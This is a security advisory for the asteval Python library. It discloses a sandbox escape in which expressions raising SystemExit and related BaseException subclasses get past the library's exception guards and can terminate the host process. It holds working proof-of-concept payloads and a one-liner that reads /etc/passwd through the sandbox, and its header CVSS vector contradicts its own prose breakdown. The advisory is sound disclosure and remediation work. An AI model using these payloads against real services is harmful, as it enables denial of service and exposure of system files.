# [M] asteval has a Sandbox Escape via BaseException Subclasses

## Summary
Severity: Medium
Advisory: GHSA-89v8-rhwq-hf77
CVE: CVE-2026-55244
CWE: CWE-248
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-89v8-rhwq-hf77
Type: github-advisory

## Affected
- PyPI: `asteval` — affected >=0 <1.0.9

## Details
## Summary

An attacker who can supply expressions to `asteval.Interpreter.eval()` can raise `SystemExit`,
`KeyboardInterrupt`, `GeneratorExit`, or `BaseException` from inside the sandbox. These
exceptions are subclasses of `BaseException` but not `Exception`, so they bypass the
`except Exception:` safety net in both `run()` and `eval()`. The exception propagates
verbatim to the calling application, terminating the process or disrupting signal and
cleanup handlers.

This is distinct from prior vulnerabilities CVE-2025-24359 (format string injection) and
GHSA-vp47-9734-prjw (AST mutation TOCTOU), both fixed in 1.0.6. This vector is present in
all versions including 1.0.6 and current HEAD.

---

## Affected Code

**`asteval/astutils.py`, lines 89–108** — `FROM_PY` exposes dangerous classes to sandbox users:

```python
FROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',
           'BaseException',          # ← escapes except Exception:
           'BufferError', 'BytesWarning',
           ...
           'GeneratorExit',          # ← escapes except Exception:
           ...
           'KeyboardInterrupt',      # ← escapes except Exception:
           ...
           'SystemExit',             # ← escapes except Exception:
           ...)
```

**`asteval/asteval.py`, line 322** — `run()` exception handler:

```python
except Exception:                    # ← does NOT catch BaseException subclasses
    if with_raise and self.expr is not None:
        self.raise_exception(node, expr=self.expr)
```

**`asteval/asteval.py`, line 370** — `eval()` exception handler:

```python
except Exception:                    # ← same gap
    if show_errors and not raise_errors:
        ...
```

**`asteval/asteval.py`, line 264** — `raise_exception()` raises the class directly:

```python
raise exc(self.error_msg)            # ← when exc=SystemExit, escapes both handlers above
```

---

## Root Cause

Python's exception hierarchy has two distinct branches under `BaseException`:

```
BaseException
├── SystemExit          ← NOT caught by except Exception:
├── KeyboardInterrupt   ← NOT caught by except Exception:
├── GeneratorExit       ← NOT caught by except Exception:
└── Exception           ← caught normally
    ├── RuntimeError
    ├── ValueError
    └── ...
```

`FROM_PY` exposes all four non-`Exception` classes to sandbox users. When a user writes
`raise SystemExit("msg")`, the `on_raise()` handler calls:

```python
self.raise_exception(None, exc=out.__class__, msg=msg, expr='')
```

which executes `raise SystemExit(msg)`. This propagates through both `except Exception:`
guards unchecked and surfaces in the calling application.

---

## Proof of Concept

```python
from asteval import Interpreter

# Variant 1: terminate the process
aeval = Interpreter()
try:
    aeval.eval('raise SystemExit("terminated by sandbox user")')
except SystemExit as e:
    print(f"[CONFIRMED] SystemExit escaped: {e.code!r}")

# Variant 2: disrupt signal/finally handling
aeval = Interpreter()
try:
    aeval.eval('raise KeyboardInterrupt("interrupt injected")')
except KeyboardInterrupt as e:
    print(f"[CONFIRMED] KeyboardInterrupt escaped: {str(e)!r}")

# Variant 3: GeneratorExit
aeval = Interpreter()
try:
    aeval.eval('raise GeneratorExit("gen escape")')
except GeneratorExit as e:
    print(f"[CONFIRMED] GeneratorExit escaped: {str(e)!r}")

# Variant 4: BaseException base class
aeval = Interpreter()
try:
    aeval.eval('raise BaseException("base escape")')
except BaseException as e:
    if not isinstance(e, Exception):
        print(f"[CONFIRMED] BaseException escaped: {str(e)!r}")
```

**Output (tested on asteval 1.0.6, Python 3.11/3.12):**

```
[CONFIRMED] SystemExit escaped: 'terminated by sandbox user'
[CONFIRMED] KeyboardInterrupt escaped: 'interrupt injected'
[CONFIRMED] GeneratorExit escaped: 'gen escape'
[CONFIRMED] BaseException escaped: 'base escape'
```

### Real-world server scenario

```python
from asteval import Interpreter

def handle_request(user_expression):
    aeval = Interpreter()
    return aeval.eval(user_expression)   # SystemExit propagates here

# Attacker sends: raise SystemExit(1)
# Application terminates. Top-level except Exception: handlers do not protect it.
try:
    handle_request('raise SystemExit(1)')
except Exception:
    pass  # <-- does NOT catch SystemExit; process exits
```

---

## Impact

| Variant | Impact |
|---------|--------|
| `SystemExit` | Process terminates; exit code and message attacker-controlled |
| `KeyboardInterrupt` | Disrupts `finally` blocks, signal handlers, and `KeyboardInterrupt`-aware loops |
| `GeneratorExit` | Disrupts generator cleanup in calling code |
| `BaseException` | Generic escape, same propagation |

Any application that:
- Accepts user-supplied expressions via `asteval`
- Relies on `except Exception:` at the top level (standard practice)
- Does not wrap `aeval.eval()` in `except BaseException:` (non-standard, unexpected requirement)

...is vulnerable to attacker-triggered process termination (DoS).

CVSS breakdown: Network-reachable (AV:N), no special conditions (AC:L), no credentials (PR:N),
no interaction (UI:N), scope unchanged (S:U), no confidentiality/integrity impact (C:N/I:N),
high availability impact — process termination (A:H).

---

## Additional Note: File Read Capability (Acknowledged Limitation)

Independently of this vulnerability, `asteval` exposes a read-only `open()` wrapper
(`_open` in `astutils.py`) that allows reading arbitrary files with the permissions of the
calling process:

```python
aeval.eval("open('/etc/passwd').read()")   # returns /etc/passwd contents
```

This is documented in `doc/motivation.rst` as a known design choice ("If reading from disk
must be forbidden, you will want to overwrite the `open()` function from the symbol table").
It is included here for completeness, not as a separate advisory claim.

---

## Recommended Fix

**Option A — Remove dangerous classes from `FROM_PY` (minimal, preferred):**

```python
# asteval/astutils.py

FROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',
           # Remove: 'BaseException',
           'BufferError', 'BytesWarning',
           'DeprecationWarning', 'EOFError', 'EnvironmentError',
           'Exception', 'False', 'FloatingPointError',
           # Remove: 'GeneratorExit',
           'IOError', 'ImportError', 'ImportWarning', 'IndentationError',
           'IndexError', 'KeyError',
           # Remove: 'KeyboardInterrupt',
           'LookupError',
           'MemoryError', 'NameError', 'None',
           'NotImplementedError', 'OSError', 'OverflowError',
           'ReferenceError', 'RuntimeError', 'RuntimeWarning',
           'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError',
           # Remove: 'SystemExit',
           'True', 'TypeError', ...)
```

**Option B — Block non-`Exception` raises in `on_raise()`:**

```python
# asteval/asteval.py

def on_raise(self, node):
    excnode = node.exc
    msgnode = node.cause
    out = self.run(excnode)
    # Prevent BaseException subclasses from escaping the sandbox
    if not issubclass(out.__class__, Exception):
        self.raise_exception(node, exc=RuntimeError,
                             msg=f"raising {out.__class__.__name__!r} is not permitted")
        return
    msg = ' '.join(str(a) for a in out.args)
    msg2 = self.run(msgnode)
    if msg2 not in (None, 'None'):
        msg = f"{msg}: {msg2}"
    self.raise_exception(None, exc=out.__class__, msg=msg, expr='')
```

Note: Option B also fixes a secondary bug on the same line — `' '.join(out.args)` crashes
with `TypeError` when args contain non-strings (e.g., `raise SystemExit(0)` with integer
code). The fix uses `str(a) for a in out.args`.

**Option C — Catch `BaseException` in `run()` and `eval()` (broadest, requires care):**

```python
except BaseException as exc:
    if isinstance(exc, (SystemExit, KeyboardInterrupt, GeneratorExit)):
        # Re-raise as RuntimeError to contain within sandbox
        self.raise_exception(node, exc=RuntimeError,
                             msg=f"{type(exc).__name__} raised in sandbox")
    elif with_raise and self.expr is not None:
        self.raise_exception(node, expr=self.expr)
```

Option A is the simplest and least likely to introduce regressions. Option B additionally
addresses the `str.join` crash on integer args.

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-06-09 | Vulnerability discovered during code review |
| 2026-06-09 | Report submitted via GitHub Security Advisory |
| TBD | Maintainer acknowledgment |
| TBD + 90 days | Public disclosure deadline |

---

## Researcher

Independent security researcher. No bug bounty program exists for this project.
CVE assignment requested via GitHub Security Advisory submission.

---

## References

- Prior CVE: CVE-2025-24359 (format string injection, fixed 1.0.6)
- Prior advisory: GHSA-vp47-9734-prjw (AST mutation TOCTOU, fixed 1.0.6)
- Python exception hierarchy: https://docs.python.org/3/library/exceptions.html#exception-hierarchy
- `asteval` documentation: https://lmfit.github.io/asteval/

## References
- https://github.com/lmfit/asteval/security/advisories/GHSA-89v8-rhwq-hf77
- https://github.com/lmfit/asteval/pull/153
- https://github.com/lmfit/asteval/commit/a3e56e7f8ed567a4817684d94213b290359077b4
- https://github.com/lmfit/asteval
- https://github.com/lmfit/asteval/releases/tag/1.0.9
